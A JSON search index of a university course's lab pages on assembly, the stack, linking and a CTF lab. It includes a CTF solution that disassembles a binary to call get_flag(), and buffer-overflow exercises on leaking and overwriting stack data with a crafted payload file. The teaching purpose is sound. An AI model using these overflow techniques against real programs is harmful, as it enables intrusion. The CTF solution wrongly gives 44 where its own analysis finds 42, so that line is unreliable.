    "content": "In a nature similar to that of the previous exercise, we take a close look at the objdump disassembly output of the binary using the objdump -D -M intel link2 command, specifically focusing on the helper() function: . 0000012b &lt;helper&gt;: (...) 137: 83 7d 08 2a cmp dword ptr [ebp + 8], 42 13b: 75 0d jne 0x14a &lt;helper+0x1f&gt; 13d: 80 7d f4 58 cmp byte ptr [ebp - 12], 88 141: 75 07 jne 0x14a &lt;helper+0x1f&gt; 143: e8 b8 fe ff ff call 0x0 &lt;get_flag&gt; . The first cmp instruction at 0x137 compares the value at [ebp + 8] with 42. This implies that the first argument passed to the helper() function is expected to be 42. The second cmp instruction at 0x13d compares the value at [ebp - 12] with 88. Since it’s comparing a single byte (byte ptr), we can infer that this corresponds to a char argument. Although it appears to be a local variable, if we look around a bit, we will notice why that is: . 131: 8b 45 0c mov eax, dword ptr [ebp + 12] 134: 88 45 f4 mov byte ptr [ebp - 12], al . The value at [ebp + 12] is moved into the eax register - this corresponds to the second argument passed to the helper function. The lower byte of eax, al, the char that we are interested in, is then moved into a local variable. If both of the aforementioned comparisons are successful, the get_flag() function is called. Hence, we can infer that we need to call the helper() function using the two arguments above - the integer 44, and the char X, which is 88 in decimal. ",
    "url": "/labs/lab-12/tasks/hidden-in-plain-sight-2/solution/README.html",
    
    "relUrl": "/labs/lab-12/tasks/hidden-in-plain-sight-2/solution/README.html"
  },"46": {
    "doc": "Task: Hidden in Plain Sight 2",
    "title": "Task: Hidden in Plain Sight 2",
    "content": "Analyze the hidden-in-plain-sight-2/support/link2 binary. Executing it is no longer a mystery, but it will be a bit more challenging to reach the flag. TIP: Not all functions are private. In case you get stuck, feel free to take a look at this! . ",
    "url": "/labs/lab-12/tasks/hidden-in-plain-sight-2/README.html",
    
    "relUrl": "/labs/lab-12/tasks/hidden-in-plain-sight-2/README.html"
  },"47": {
    "doc": "Lab 12 - CTF",
    "title": "Lab 12 - CTF",
    "content": " ",
    "url": "/labs/lab-12/README.html",
    
    "relUrl": "/labs/lab-12/README.html"
  },"48": {
    "doc": "Lab 12 - CTF",
    "title": "Getting the Latest Changes",
    "content": "Before starting this lab, ensure you have the latest changes. If you have no local changes, you can simply run git pull and you are ready to go: . student@hsi:~$ cd hardware-software-interface student@hsi:~/hardware-software-interface$ git status # Check if you have unstaged changes On branch main nothing to commit, working tree clean # \"working tree clean\" means that you have no changes student@hsi:~/hardware-software-interface$ git checkout main # Change branch to main student@hsi:~/hardware-software-interface$ git pull --rebase . If the git status output differs, follow the instructions to save your progress. ",
    "url": "/labs/lab-12/README.html#getting-the-latest-changes",
    
    "relUrl": "/labs/lab-12/README.html#getting-the-latest-changes"
  },"49": {
    "doc": "Lab 12 - CTF",
    "title": "Save Progress and Prepare Next Lab",
    "content": ". | Check if you have unstaged changes that might be lost: . student@hsi:~$ cd hardware-software-interface student@hsi:~/hardware-software-interface$ git status On branch &lt;not-important&gt; Changes not staged for commit: (use \"git add &lt;file&gt;...\" to update what will be committed) (use \"git restore &lt;file&gt;...\" to discard changes in working directory) modified: main.c . If git status states “work tree clean”, you should follow the instructions to pull latest changes instead. | Create a commit to store your changes: . student@hsi:~/hardware-software-interface$ git add . student@hsi:~/hardware-software-interface$ git commit -m \"Store progress for lab-11\" student@hsi:~/hardware-software-interface$ git status # double check that everything was committed On branch &lt;not-important&gt; nothing to commit, working tree clean . | Create a new branch for lab-12: . student@hsi:~/hardware-software-interface$ git checkout -b lab-12 main # Replace lab-12 with lab number student@hsi:~/hardware-software-interface$ git pull origin main # Get latest changes from origin/main . | . ",
    "url": "/labs/lab-12/README.html#save-progress-and-prepare-next-lab",
    
    "relUrl": "/labs/lab-12/README.html#save-progress-and-prepare-next-lab"
  },"50": {
    "doc": "Task: GCD - Greatest Common Divisor",
    "title": "Task: GCD - Greatest Common Divisor",
    "content": "Open gcd.asm and run the program. The code calculates the greatest common divisor (GCD) of two numbers given as parameters using the eax and edx registers, and then stores the calculated value back in the eax register. | Make the necessary modifications so that the error message - Segmentation fault (core dumped) - no longer appears. | Within the print label, display the result in the following format: | . gcd(49, 28) = 7 . If you’re having difficulties solving this exercise, go through this reading material . ",
    "url": "/labs/lab-07/tasks/gcd/README.html",
    
    "relUrl": "/labs/lab-07/tasks/gcd/README.html"
  },"51": {
    "doc": "Task: GCD - Greatest Common Divisor",
    "title": "Checker",
    "content": "To run the checker, go into the tests directory, then type make check. A successful output of the checker should look like this : . student@os:~/.../lab-07/tasks/gcd/tests$ make &amp;&amp; make check test_segfault .................................... passed ... 50 test_gcd .................................... passed ... 50 ======================================================================== Total: 100/100 . ",
    "url": "/labs/lab-07/tasks/gcd/README.html#checker",
    
    "relUrl": "/labs/lab-07/tasks/gcd/README.html#checker"
  },"52": {
    "doc": "Task: Reverse Array",
    "title": "Task: Reverse Array",
    "content": "Building on the reverse-array.asm exercise, implement the TODOs without using the mov instruction when working with arrays, so that at the end of the program, the output array contains the input array in reverse order. NOTE: After a correct solution, the program should print: . Reversed array: 911 845 263 242 199 184 122 . If you’re having difficulties solving this exercise, go through this reading material . ",
    "url": "/labs/lab-07/tasks/reverse-array/README.html",
    
    "relUrl": "/labs/lab-07/tasks/reverse-array/README.html"
  },"53": {
    "doc": "Task: Reverse Array",
    "title": "Checker",
    "content": "To run the checker, go into the tests directory located in src, then type make check. A successful output of the checker should look like this : . student@os:~/.../lab-07/tasks/reverse-array/tests$ make &amp;&amp; make check test_reverse_array ........................... passed ... 100 ======================================================================== Total: 100/100 . ",
    "url": "/labs/lab-07/tasks/reverse-array/README.html#checker",
    
    "relUrl": "/labs/lab-07/tasks/reverse-array/README.html#checker"
  },"54": {
    "doc": "Task: Max",
    "title": "Task: Max",
    "content": "Calculate the maximum between two numbers in two registers (eax and ebx) using a comparison instruction, a jump instruction, and push/pop instructions. TIP: Consider how you can swap two registers using the stack. If you’re having difficulties solving this exercise, go through this reading material . ",
    "url": "/labs/lab-07/tasks/max/README.html",
    
    "relUrl": "/labs/lab-07/tasks/max/README.html"
  },"55": {
    "doc": "Task: Max",
    "title": "Checker",
    "content": "To run the checker, go into the tests directory located in src, then type make check. A successful output of the checker should look like this : . student@os:~/.../lab-07/tasks/gcd/max$ make &amp;&amp; make check test_max ................................... passed ... 100 ======================================================================== Total: 100/100 . ",
    "url": "/labs/lab-07/tasks/max/README.html#checker",
    
    "relUrl": "/labs/lab-07/tasks/max/README.html#checker"
  },"56": {
    "doc": "Task: Local Var",
    "title": "Task: Local Var",
    "content": "The program local-var.asm in the laboratory archive combines two sorted arrays (array_1 and array_2) by placing the resulting array in array_output defined in the .data section. Modify the program so that array_1, array_2, and array_output are allocated on the stack. The array allocation is done using the sub instruction. For the copies of arrays array_1 and array_2, you will need to copy their elements from the .data section to the stack before using them. If you’re having difficulties solving this exercise, go through this reading material . ",
    "url": "/labs/lab-07/tasks/local-var/README.html",
    
    "relUrl": "/labs/lab-07/tasks/local-var/README.html"
  },"57": {
    "doc": "Task: Local Var",
    "title": "Checker",
    "content": "To run the checker, go into the tests directory located in src, then type make check. A successful output of the checker should look like this : . student@os:~/.../lab-07/tasks/local-var/tests$ make &amp;&amp; make check test_local_var ............................. passed ... 100 ======================================================================== Total: 100/100 . ",
    "url": "/labs/lab-07/tasks/local-var/README.html#checker",
    
    "relUrl": "/labs/lab-07/tasks/local-var/README.html#checker"
  },"58": {
    "doc": "Task: Stack Addressing",
    "title": "Task: Stack Addressing",
    "content": "The stack-addressing.asm program in the lab’s archive allocates and initializes two local variables on the stack: . | an array of natural numbers from 1 to NUM | a string “Bob has corn”. | . | Replace each push instruction with an equivalent sequence of instructions. | Print the addresses and values on the stack in the interval [esp, ebp] (from high addresses to low addresses) dword by dword. | Print the string allocated on the stack byte by byte and explain how it looks in memory. Think about where you should start displaying and when you should stop. | Print the vector allocated on the stack element by element. Think about where you should start displaying and what size each element has. | . After a successful implementation, the program should display something similar to the following output (it won’t be exactly the same, stack memory addresses may differ): . Bob has corn 0xffe804cc: 0xf7d91519 0xffe804c8: 0x5 0xffe804c4: 0x4 0xffe804c0: 0x3 0xffe804bc: 0x2 0xffe804b8: 0x1 0xffe804b4: 0x0 0xffe804b0: 0x6e726f63 0xffe804ac: 0x20736168 0xffe804a8: 0x20626f42 Bob has corn 1 2 3 4 5 . Explain the significance of each byte. Why are they arranged in that particular order? . TIP: Remember that ASCII character codes are represented as decimal values. Remember the order in which the bytes of a larger number are stored: review the section Order of representation of numbers larger than one byte from Lab 01. If you’re having difficulties solving this exercise, go through this reading material . ",
    "url": "/labs/lab-07/tasks/stack-addressing/README.html",
    
    "relUrl": "/labs/lab-07/tasks/stack-addressing/README.html"
  },"59": {
    "doc": "Task: Stack Addressing",
    "title": "Checker",
    "content": "To run the checker, go into the tests directory located in src, then type make check. A successful output of the checker should look like this : . student@os:~/.../lab-07/tasks/reverse-array/tests$ make &amp;&amp; make check test_stack_addresing .......................... passed ... 100 ======================================================================== Total: 100/100 . ",
    "url": "/labs/lab-07/tasks/stack-addressing/README.html#checker",
    
    "relUrl": "/labs/lab-07/tasks/stack-addressing/README.html#checker"
  },"60": {
    "doc": "Guide: Stack Addressing",
    "title": "Guide: Stack Addressing",
    "content": "The stack_addressing.asm file demonstrates how data is stored on the stack, and especially in what order. Here’s what an usual output for the compiled program would be: . 0xff99fba8: 0xf7f46020 0xff99fba4: 0xa 0xff99fba0: 0xb 0xff99fb9c: 0xc 0xff99fb98: 0xd . Note: The last 4 values are the ones we pushed on stack. What is the first one? . Answer: It is the old EBP we push at the start of the function. For convenience, here’s the contents of the file. To play around with it, download the lab locally. %include \"printf32.asm\" section .text extern printf global main main: push ebp mov ebp, esp push dword 10 push dword 11 push dword 12 push dword 13 mov eax, ebp print_stack: PRINTF32 `0x\\x0` PRINTF32 `%x\\x0`, eax PRINTF32 `: 0x\\x0` PRINTF32 `%x\\n\\x0`, [eax] sub eax, 4 cmp eax, esp jge print_stack xor eax, eax leave ret . ",
    "url": "/labs/lab-07/guides/stack-addressing/README.html",
    
    "relUrl": "/labs/lab-07/guides/stack-addressing/README.html"
  },"61": {
    "doc": "Guide: Stack Operations",
    "title": "Guide: Stack Operations",
    "content": "The stack_operations.asm file demonstrates various stack operations. The main focus is to show how to manipulate the stack by pushing and popping values, and how to “allocate” and “deallocate” memory on the stack. Note: Notice how push and pop are just syntactic sugar for the simpler sub, add, and mov instructions. For convenience, here’s the contents of the file. To play around with it, download the lab locally. %include \"printf32.asm\" section .data var: dd ? section .text ; esp -&gt; stack pointer ; ebp -&gt; base pointer extern printf global main main: push ebp mov ebp, esp push dword 10 ; sub esp, 4; mov [esp], 10; push dword 11 ; sub esp, 4; mov [esp], 11; push dword 12 ; sub esp, 4; mov [esp], 12; push dword 13 ; sub esp, 4; mov [esp], 13; push dword 14 ; sub esp, 4; mov [esp], 13; pusha ; push all registers on the stack popa ; pop all registers from the stack ; Version 1 pop eax; ; mov eax, [esp]; add esp, 4 pop eax; ; mov eax, [esp]; add esp, 4 pop eax; ; mov eax, [esp]; add esp, 4 pop eax; ; mov eax, [esp]; add esp, 4 pop eax; ; mov eax, [esp]; add esp, 4 ; Version 2 ; add esp, 20 ; 4 * number_of_push ; Version 3 ; mov esp, ebp ; sub esp &lt;-&gt; add esp -&gt; use to allocate/deallocate memory ; Aloc 8 bytes &lt;-&gt; 2 int ; sub esp, 8 ; mov [esp], 10 ; mov [esp + 4], 12 ; Push/Pop from global variable mov dword [var], 1337 push dword [var] pop dword [var] mov eax, [var] PRINTF32 `VAR: %d\\n\\x0`, eax leave ret . ",
    "url": "/labs/lab-07/guides/stack-operations/README.html",
    
    "relUrl": "/labs/lab-07/guides/stack-operations/README.html"
  },"62": {
    "doc": "Lab 7 - The Stack",
    "title": "Lab 7 - The Stack",
    "content": " ",
    "url": "/labs/lab-07/README.html",
    
    "relUrl": "/labs/lab-07/README.html"
  },"63": {
    "doc": "Lab 7 - The Stack",
    "title": "Getting the Latest Changes",
    "content": "Before starting this lab, ensure you have the latest changes. If you have no local changes, you can simply run git pull and you are ready to go: . student@hsi:~$ cd hardware-software-interface student@hsi:~/hardware-software-interface$ git status # Check if you have unstaged changes On branch main nothing to commit, working tree clean # \"working tree clean\" means that you have no changes student@hsi:~/hardware-software-interface$ git checkout main # Change branch to main student@hsi:~/hardware-software-interface$ git pull --rebase . If the git status output differs, follow the instructions to save your progress. ",
    "url": "/labs/lab-07/README.html#getting-the-latest-changes",
    
    "relUrl": "/labs/lab-07/README.html#getting-the-latest-changes"
  },"64": {
    "doc": "Lab 7 - The Stack",
    "title": "Save Progress and Prepare Next Lab",
    "content": ". | Check if you have unstaged changes that might be lost: . student@hsi:~$ cd hardware-software-interface student@hsi:~/hardware-software-interface$ git status On branch &lt;not-important&gt; Changes not staged for commit: (use \"git add &lt;file&gt;...\" to update what will be committed) (use \"git restore &lt;file&gt;...\" to discard changes in working directory) modified: main.c . If git status states “work tree clean”, you should follow the instructions to pull latest changes instead. | Create a commit to store your changes: . student@hsi:~/hardware-software-interface$ git add . student@hsi:~/hardware-software-interface$ git commit -m \"Store progress for lab-06\" student@hsi:~/hardware-software-interface$ git status # double check that everything was committed On branch &lt;not-important&gt; nothing to commit, working tree clean . | Create a new branch for lab-07: . student@hsi:~/hardware-software-interface$ git checkout -b lab-07 main # Replace lab-07 with lab number student@hsi:~/hardware-software-interface$ git pull origin main # Get latest changes from origin/main . | . ",
    "url": "/labs/lab-07/README.html#save-progress-and-prepare-next-lab",
    
    "relUrl": "/labs/lab-07/README.html#save-progress-and-prepare-next-lab"
  },"65": {
    "doc": "Task: Linking Multiple Files",
    "title": "Task: Linking Multiple Files",
    "content": "Access the directory tasks/multiple-link/support/example/. We want to follow the linking commands from multiple C source files: main.c, add.c, sub.c. As in the previous exercises, there are three subdirectories for three different scenarios: . | a-no-header/: external function declarations are made directly in the C source file (main.c) | b-header/: external function declarations are made in a separate header file (ops.h) | c-lib/: external function declarations are made in a separate header file, and linking is done using a static library | . In each subdirectory, we use the make command to compile the executable file main. Access the directory tasks/multiple-link/support/diy/. We want to compile and link the source files in each subdirectory, following the model of the previous exercise. Copy the Makefile files and update them in each subdirectory to obtain the executable file. Checker: To test the implementation, enter the tests/ directory and run: ./run_all_tests.sh . In case of a correct solution, you will get this output: ./run_all_tests.sh test_a-no-header ........................ passed ... 100 test_b-header ........................ passed ... 100 test_c-lib ........................ passed ... 100 ======================================================================== Total: 100/100 . If you’re having difficulties solving this exercise, go through this reading material. ",
    "url": "/labs/lab-11/tasks/multiple-link/README.html",
    
    "relUrl": "/labs/lab-11/tasks/multiple-link/README.html"
  },"66": {
    "doc": "Task: Using Symbols (Variables and Functions)",
    "title": "Task: Using Symbols (Variables and Functions)",
    "content": "Access the directory tasks/var-func-fix/support/. Run the make command, run the resulted executable, interpret the encountered error, and resolve it by editing the source files. Checker: To test the implementation, enter the tests/ directory and run: ./run_all_tests.sh . In case of a correct solution, you will get this output: ./run_all_tests.sh test_var-func-fix ........................ passed ... 100 ======================================================================== Total: 100/100 . If you’re having difficulties solving this exercise, go through this reading material. ",
    "url": "/labs/lab-11/tasks/var-func-fix/README.html",
    
    "relUrl": "/labs/lab-11/tasks/var-func-fix/README.html"
  },"67": {
    "doc": "Task: Linking a Single File",
    "title": "Task: Linking a Single File",
    "content": "Access the directory tasks/single-link/support/example/. We want to follow the linking commands for a single C source file. The source file is hello.c. In the three subdirectories, you will find support files for the following scenarios: . | a-dynamic/: creating a dynamic executable file | b-static/: creating a static executable file | c-standalone/: creating a standalone executable file without the standard C library | . In each subdirectory, we use the make command to compile the executable file hello. We use the command file hello to check whether the file is compiled dynamically or statically. In the Makefile files, the linking command uses gcc. An equivalent command that directly uses ld is commented out. To track the direct usage of ld, we can comment out the gcc command and uncomment the ld command. In the case of c-standalone/, since we are not using the standard C library or C runtime library, we need to replace their functionalities. The functionalities are replaced in the start.asm and puts.asm files. These files implement the _start function/symbol and the puts function, respectively. The _start function/symbol is, by default, the entry point of an executable program. The _start function is responsible for calling the main function and terminating the program. Because there is no standard library, these two files are written in assembly language and use system calls. Bonus: Add a command in the Makefile in the c-standalone/ directory that explicitly uses ld for linking. Access the directory tasks/single-link/support/diy/. We want to compile and link the source files in each subdirectory, following the model of the previous exercise. Copy the Makefile files and update them in each subdirectory to obtain the executable file. Checker: To test the implementation, enter the tests/ directory and run: ./run_all_tests.sh . In case of a correct solution, you will get this output: ./run_all_tests.sh test_a-dynamic ........................ passed ... 100 test_b-static ........................ passed ... 100 test_c-standalone ........................ passed ... 100 ======================================================================== Total: 100/100 . If you’re having difficulties solving this exercise, go through this reading material. ",
    "url": "/labs/lab-11/tasks/single-link/README.html",
    
    "relUrl": "/labs/lab-11/tasks/single-link/README.html"
  },"68": {
    "doc": "Task: Fixing Library Issues",
    "title": "Task: Fixing Library Issues",
    "content": "Access the directory tasks/lib-fix/support/. Run the make command, interpret the encountered error, and resolve it by editing the Makefile. Refer to the Makefile in the directory tasks/multiple-link/support/example/c-lib/. Checker: To test the implementation, enter the tests/ directory and run: ./run_all_tests.sh . In case of a correct solution, you will get this output: ./run_all_tests.sh test_library_issue ........................ passed ... 100 ======================================================================== Total: 100/100 . If you’re having difficulties solving this exercise, go through this reading material. ",
    "url": "/labs/lab-11/tasks/lib-fix/README.html",
    
    "relUrl": "/labs/lab-11/tasks/lib-fix/README.html"
  },"69": {
    "doc": "Task: Using Variables",
    "title": "Task: Using Variables",
    "content": "Access the directory tasks/vars-obs/support/. We want to track the use of global variables, both exported and non-exported. In the hidden.c file, we have the static (non-exported) variable hidden_value. This variable is modified and accessed using non-exported functions: init(), get(), set(). In the plain.c file, we have the exported variable age. This variable can be modified and accessed directly. These variables are used directly (age) or indirectly (hidden_value) in the main.c file. To use them, the functions and variables are declared in the ops.h file. A function is declared by specifying the header. A variable is declared by prefixing it with extern. Modify main.c such that hidden_value is set to 10 and age is set to 33. Checker: To test the implementation, enter the tests/ directory and run: ./run_all_tests.sh . In case of a correct solution, you will get this output: ./run_all_tests.sh test_vars-obs ........................ passed ... 100 ======================================================================== Total: 100/100 . If you’re having difficulties solving this exercise, go through this reading material. ",
    "url": "/labs/lab-11/tasks/vars-obs/README.html",
    
    "relUrl": "/labs/lab-11/tasks/vars-obs/README.html"
  },"70": {
    "doc": "Task: Fixing the Entry Point 1",
    "title": "Task: Fixing the Entry Point 1",
    "content": "Access the directory tasks/entry-fix-1/support/. We want to track issues with defining the main() function. Go to the subdirectory a-c/. Run the make command, interpret the encountered error, and resolve it by editing the hello.c file. Go to the subdirectory b-asm/. Run the make command, interpret the encountered error, and resolve it by editing the hello.asm file. Bonus: In the subdirectories c-extra-nolibc/ and d-extra-libc/, find solutions that do not modify the source code of hello.c. These solutions instead modify the build system to use a different function, other than main(), as the program’s entry point. Checker: To test the implementation, enter the tests/ directory and run: ./run_all_tests.sh . In case of a correct solution, you will get this output: ./run_all_tests.sh test_a-c ........................ passed ... 25 test_b-asm ........................ passed ... 25 test_c-extra-nolibc ........................ passed ... 25 test_d-extra-libc ........................ passed ... 25 ======================================================================== Total: 100/100 . If you’re having difficulties solving this exercise, go through this reading material. ",
    "url": "/labs/lab-11/tasks/entry-fix-1/README.html",
    
    "relUrl": "/labs/lab-11/tasks/entry-fix-1/README.html"
  },"71": {
    "doc": "Task: Linking an Object File (without Source Code)",
    "title": "Task: Linking an Object File (without Source Code)",
    "content": "Access the directory tasks/obj-link-dev/support/. The file shop.o exposes an interface (functions and variables) that allows displaying messages. Edit the main.c file to properly call the exposed interface and display the messages: . price is 21 quantity is 42 . Explore the interface and the content of the functions in the shop.o file using nm and objdump. Checker: To test the implementation, enter the tests/ directory and run: ./run_all_tests.sh . In case of a correct solution, you will get this output: ./run_all_tests.sh test_linking-object-file ........................ passed ... 100 ======================================================================== Total: 100/100 . If you’re having difficulties solving this exercise, go through this reading material. ",
    "url": "/labs/lab-11/tasks/obj-link-dev/README.html",
    
    "relUrl": "/labs/lab-11/tasks/obj-link-dev/README.html"
  },"72": {
    "doc": "Task: Warning (not an Error)",
    "title": "Task: Warning (not an Error)",
    "content": "Access the directory tasks/include-fix/support/. Run the make command. A warning appears, but it is from the preprocessing/compilation process. Resolve this warning by editing the hello.c file. Bonus: Fix the warning without using the #include directive. Checker: To test the implementation, enter the tests/ directory and run: ./run_all_tests.sh . In case of a correct solution, you will get this output: ./run_all_tests.sh test_warning ........................ passed ... 100 ======================================================================== Total: 100/100 . If you’re having difficulties solving this exercise, go through this reading material. ",
    "url": "/labs/lab-11/tasks/include-fix/README.html",
    
    "relUrl": "/labs/lab-11/tasks/include-fix/README.html"
  },"73": {
    "doc": "Task: Fixing the Entry Point",
    "title": "Task: Fixing the Entry Point",
    "content": "Access the directory tasks/entry-fix-2/support/. Run the make command, interpret the encountered error, and resolve it by editing the hello.c file. Checker: To test the implementation, enter the tests/ directory and run: ./run_all_tests.sh . In case of a correct solution, you will get this output: ./run_all_tests.sh test_EntryFix2 ........................ passed ... 100 ======================================================================== Total: 100/100 . If you’re having difficulties solving this exercise, go through this reading material. ",
    "url": "/labs/lab-11/tasks/entry-fix-2/README.html",
    
    "relUrl": "/labs/lab-11/tasks/entry-fix-2/README.html"
  },"74": {
    "doc": "Task: Fixing Export Issues",
    "title": "Task: Fixing Export Issues",
    "content": "Access the directory tasks/export-fix/support/. Each subdirectory (a-func/, b-var/, c-var-2/) contains a problem related to the export of symbols (functions or variables). In each subdirectory, run the make command, identify the issue, and edit the necessary files to resolve it. Checker: To test the implementation, enter the tests/ directory and run: ./run_all_tests.sh . In case of a correct solution, you will get this output: ./run_all_tests.sh test_a-func ........................ passed ... 30 test_b-var ........................ passed ... 30 test_c-var-2 ........................ passed ... 40 ======================================================================== Total: 100/100 . If you’re having difficulties solving this exercise, go through this reading material. ",
    "url": "/labs/lab-11/tasks/export-fix/README.html",
    
    "relUrl": "/labs/lab-11/tasks/export-fix/README.html"
  },"75": {
    "doc": "Guide: Linking C and C++",
    "title": "Guide: Linking C and C++",
    "content": "Access the directory tasks/cpp-obs/support/. We want to observe how linking is performed with mixed sources: C and C++. In the bad/ subdirectory, we have two directories, c-calls-cpp/ and cpp-calls-c/, where we combine C and C++ sources. In both cases, using make displays errors. This occurs because C++ symbols are mangled. If we use the nm command on object modules obtained from C source code, we get: . $ nm add.o 0000000000000000 T _Z3addii $ nm sub.o 0000000000000000 T _Z3subii . The symbol names are not add and sub, but rather _Z3addii and _Z3subii. C++ symbol names are mangled and define the function signature. This allows for functions with the same name but different signatures. Details about name mangling can be found here. To resolve this, symbols defined in C and imported into C++, or vice versa, must be prefixed with the directive extern \"C\". This way, the C++ compiler will use simple names for the imported/exported symbols, allowing them to be used together with C modules. This is implemented in the good/ subdirectory. Details about the extern \"C\" directive can be found here. ",
    "url": "/labs/lab-11/guides/cpp-obs/README.html",
    
    "relUrl": "/labs/lab-11/guides/cpp-obs/README.html"
  },"76": {
    "doc": "Lab 11 - Linking",
    "title": "Lab 11 - Linking",
    "content": " ",
    "url": "/labs/lab-11/README.html",
    
    "relUrl": "/labs/lab-11/README.html"
  },"77": {
    "doc": "Lab 11 - Linking",
    "title": "Getting the Latest Changes",
    "content": "Before starting this lab, ensure you have the latest changes. If you have no local changes, you can simply run git pull and you are ready to go: . student@hsi:~$ cd hardware-software-interface student@hsi:~/hardware-software-interface$ git status # Check if you have unstaged changes On branch main nothing to commit, working tree clean # \"working tree clean\" means that you have no changes student@hsi:~/hardware-software-interface$ git checkout main # Change branch to main student@hsi:~/hardware-software-interface$ git pull --rebase . If the git status output differs, follow the instructions to save your progress. ",
    "url": "/labs/lab-11/README.html#getting-the-latest-changes",
    
    "relUrl": "/labs/lab-11/README.html#getting-the-latest-changes"
  },"78": {
    "doc": "Lab 11 - Linking",
    "title": "Save Progress and Prepare Next Lab",
    "content": ". | Check if you have unstaged changes that might be lost: . student@hsi:~$ cd hardware-software-interface student@hsi:~/hardware-software-interface$ git status On branch &lt;not-important&gt; Changes not staged for commit: (use \"git add &lt;file&gt;...\" to update what will be committed) (use \"git restore &lt;file&gt;...\" to discard changes in working directory) modified: main.c . If git status states “work tree clean”, you should follow the instructions to pull latest changes instead. | Create a commit to store your changes: . student@hsi:~/hardware-software-interface$ git add . student@hsi:~/hardware-software-interface$ git commit -m \"Store progress for lab-10\" student@hsi:~/hardware-software-interface$ git status # double check that everything was committed On branch &lt;not-important&gt; nothing to commit, working tree clean . | Create a new branch for lab-11: . student@hsi:~/hardware-software-interface$ git checkout -b lab-11 main # Replace lab-11 with lab number student@hsi:~/hardware-software-interface$ git pull origin main # Get latest changes from origin/main . | . ",
    "url": "/labs/lab-11/README.html#save-progress-and-prepare-next-lab",
    
    "relUrl": "/labs/lab-11/README.html#save-progress-and-prepare-next-lab"
  },"79": {
    "doc": "Task: Buffer on the Stack",
    "title": "Task: Buffer on the Stack",
    "content": "Access the tasks/stack-buffer/support/ directory from the lab resource archive and consult the stack_buffer.asm file. This file contains a program that populates a buffer with information and then displays it. It is similar to the one above, but now the buffer is allocated on the stack. The task will contain 3 parts. ",
    "url": "/labs/lab-10/tasks/stack-buffer/README.html",
    
    "relUrl": "/labs/lab-10/tasks/stack-buffer/README.html"
  },"80": {
    "doc": "Task: Buffer on the Stack",
    "title": "Part 1",
    "content": "Carefully review the program, then compile it using the command: . make . then run it using the command: ./stack_buffer . Observe the behavior of the program according to its code. In addition to the buffer, we have also allocated a local variable of 4 bytes, accessible at the address ebp - 4. It is initialized to the value 0xCAFEBABE. This variable will be important later on. What is relevant now is to know that this variable is in memory immediately after the buffer: when the buffer limit is exceeded, you reach this variable. What is the difference between the two programs inspected so far? . ",
    "url": "/labs/lab-10/tasks/stack-buffer/README.html#part-1",
    
    "relUrl": "/labs/lab-10/tasks/stack-buffer/README.html#part-1"
  },"81": {
    "doc": "Task: Buffer on the Stack",
    "title": "Part 2",
    "content": "Now that we have seen what the buffer looks like in memory and where the variable is placed, update the stack_buffer.asm program so that the buffer display sequence (Look for TODO 1) also leads to the display of the variable’s bytes. It is a case of read buffer overflow, with the objective of information leak: finding out information from memory. HINT It’s not complicated, you just need to “instruct” the display sequence to use a different limit for display, not the current limit of 64 bytes. Follow TODO 2 and display other information beyond the local variable. What information comes on the stack after the local variable (the next 4 bytes)? And the next 4 bytes after? . ",
    "url": "/labs/lab-10/tasks/stack-buffer/README.html#part-2",
    
    "relUrl": "/labs/lab-10/tasks/stack-buffer/README.html#part-2"
  },"82": {
    "doc": "Task: Buffer on the Stack",
    "title": "Part 3",
    "content": "Based on the experience above, make changes so that the variable’s value is 0xDEADBEEF (instead of 0xCAFEBABE as it is initially) without, however, explicitly modifying the variable’s value. Look for TODO 3 and use the buffer modification and the ebx register in which we stored the start address of the buffer. TIP Again, it’s not complicated. You need to use the ebx value and an offset to write the 0xDEADBEEF value at that address. That is, use a construction like: . mov byte [ebx + TODO], TODO . Do this after the buffer initialization sequence (after the jl fill_byte instruction). With a correct solution to this exercise, the program will display the 0xDEADBEEF value for the local variable. ",
    "url": "/labs/lab-10/tasks/stack-buffer/README.html#part-3",
    
    "relUrl": "/labs/lab-10/tasks/stack-buffer/README.html#part-3"
  },"83": {
    "doc": "Task: Buffer on the Stack",
    "title": "Checking Your Solution",
    "content": "Test your solution in the support/ folder. Afterwards, navigate to the tests directory and run: . make check test_part2........................................passed test_part3........................................passed Total: 100/100 . If your solution is correct, you will receive a 100/100 result. If you’re having difficulties solving this exercise, go through this reading material. ",
    "url": "/labs/lab-10/tasks/stack-buffer/README.html#checking-your-solution",
    
    "relUrl": "/labs/lab-10/tasks/stack-buffer/README.html#checking-your-solution"
  },"84": {
    "doc": "Task: Buffer Overflow with Data from Standard Input and fgets()",
    "title": "Task: Buffer Overflow with Data from Standard Input and fgets()",
    "content": "As mentioned in the Read Using gets task, the gets() function is prohibited in current programs. Instead, the fgets() function can be used. Open the source code file read_stdin_fgets.asm from the tasks/read-stdin-fgets/support/. In the read_stdin_fgets.asm source file, follow TODO 1 and change the gets() function call to the fgets() function call. For the fgets() call, read from standard input. As an argument for the third parameter of fgets() (of type FILE *) you will use standard input. To specify standard input, use the stdin stream. You will need to mark it as external using, at the beginning of the assembly language file, the construction: . extern stdin . stdin is an address; to call fgets() with standard input, it is sufficient to pass on the stack the value from the stdin address, i.e., using the construction: . push dword [stdin] . HINT Follow the manual page of the fgets() function to find out what parameters it receives. TIP Since the fgets() function has 3 parameters (which occupy 3 × 4 = 12 bytes) you will need to use add esp, 12 after the function call, in restoring the stack, instead of add esp, 4 as in the case of the program above that used gets(). IMPORTANT Do not modify the assembly language code. Transmit the input string in the appropriate format to the standard input to generate a buffer overflow and to obtain the required result. Follow TODO 2 in code and call fgets() instead of gets, but keep in mind that you will have to push a value big enough for the buffer size in order to produce an overflow. The result should be the same like in the read_stdin_gets task. TIP As above, to transmit the input string for the program, it is recommended to write it in a file and then redirect that file to the corresponding program command. Redirecting the payload file to the program is done using a command like: ./read_stdin_fgets &lt; payload . What happens if you push buffer_length - 1, instead of buffer_length. Why var is 0x004F4C46 now? . ",
    "url": "/labs/lab-10/tasks/read-stdin-fgets/README.html",
    
    "relUrl": "/labs/lab-10/tasks/read-stdin-fgets/README.html"
  },"85": {
    "doc": "Task: Buffer Overflow with Data from Standard Input and fgets()",
    "title": "Checking Your Solution",
    "content": "In order to verify your exploit, please complete the exploit.py TODOs. Run it using python3 exploit.py. Afterwards, navigate to the tests directory and run: . make check test........................................passed Total: 100/100 . If your solution is correct, you will receive a 100/100 result. If you’re having difficulties solving this exercise, go through this reading material. ",
    "url": "/labs/lab-10/tasks/read-stdin-fgets/README.html#checking-your-solution",
    
    "relUrl": "/labs/lab-10/tasks/read-stdin-fgets/README.html#checking-your-solution"
  },"86": {
    "doc": "Writeup",
    "title": "Writeup",
